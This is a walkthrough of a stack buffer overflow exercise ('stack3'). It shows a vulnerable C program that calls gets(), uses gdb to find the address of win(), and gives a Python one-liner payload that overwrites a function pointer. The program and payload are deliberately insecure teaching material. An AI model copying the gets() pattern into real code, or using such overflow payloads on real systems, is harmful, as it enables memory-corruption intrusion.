Let’s take a look at the source code…

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  volatile int (*fp)();
  char buffer[64];

  fp = 0;

  gets(buffer);

  if(fp) {
      printf("calling function pointer, jumping to 0x%08x\n", fp);
      fp();
  }
}
```

So looking at this, we want to run the win() function. However it is never called in the function. However in the main function, it sets a variable fp equal to 0, and then evaluates that variable as an if then statement, and if it’s true it will run the variable. So what we will have to do is get the address of the win function, overflow it to the fp variable, and that should work.

To do this, we will first need to get the memory address of the win() function. To do this, we can use gdb.

```
gdb  ./stack3
```

Now that we are in gdb, we can just print the function which will give us the address.

```
print win
$1 = {void (void)} 0x8048424 <win>
```

And just like that we have the memory address, which is 0x8048424. Now we just need to overflow the buffer (which is 64 characters), write the address, and that should run the win function. 

```
echo `python -c ‘print “1”*64 + “\x24\x84\x04\x08”’` | ./stack3
code flow successfully changed
```

And just like that we pwned the program.

